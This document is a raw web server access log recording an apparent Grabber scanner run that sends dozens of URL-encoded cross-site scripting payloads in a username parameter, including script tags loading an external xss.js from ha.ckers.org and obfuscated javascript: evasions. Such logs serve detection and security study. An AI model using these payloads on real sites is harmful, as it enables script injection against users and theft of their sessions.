172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CSCRIPT+%3D%22blah%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CSCRIPT+%3D%22blah%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CSCRIPT+a%3D%22blah%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CSCRIPT+a%3D%22blah%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CSCRIPT+a%3D%22%3E%27%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CSCRIPT+a%3D%22%3E%27%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CTABLE+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTABLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CTABLE+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTABLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2Fwww.gohttp%3A%2F%2Fwww.google.com%2Fogle.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2Fwww.gohttp%3A%2F%2Fwww.google.com%2Fogle.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Aalert%28%27XSS%27%29%22%3E%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /?username=%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Aalert%28%27XSS%27%29%22%3E%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:30 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2Fwww.google.com.%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2Fwww.google.com.%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2Fgoogle.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2Fgoogle.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CSCRIPT%3Ea%3D%2FXSS%2F+alert%28a.source%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CSCRIPT%3Ea%3D%2FXSS%2F+alert%28a.source%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=perl+-e+%27print+%22%3CIMG+SRC%3Djava%00script%3Aalert%28%22XSS%22%29%3E%22%3B%27%3E+out HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=perl+-e+%27print+%22%3CIMG+SRC%3Djava%00script%3Aalert%28%22XSS%22%29%3E%22%3B%27%3E+out HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=perl+-e+%27print+%22%26%3CSCR%00IPT%3Ealert%28%22XSS%22%29%3C%2FSCR%00IPT%3E%22%3B%27+%3E+out HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=perl+-e+%27print+%22%26%3CSCR%00IPT%3Ealert%28%22XSS%22%29%3C%2FSCR%00IPT%3E%22%3B%27+%3E+out HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CBODY+onload%21%23%24%25%26%28%29%2A%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CBODY+onload%21%23%24%25%26%28%29%2A%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CDIV+STYLE%3D%22background-image%3A%00075%00072%0006C%00028%27%0006a%00061%00076%00061%00073%00063%00072%00069%00070%00074%0003a%00061%0006c%00065%00072%00074%00028.1027%00058.1053%00053%00027%00029%27%00029%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
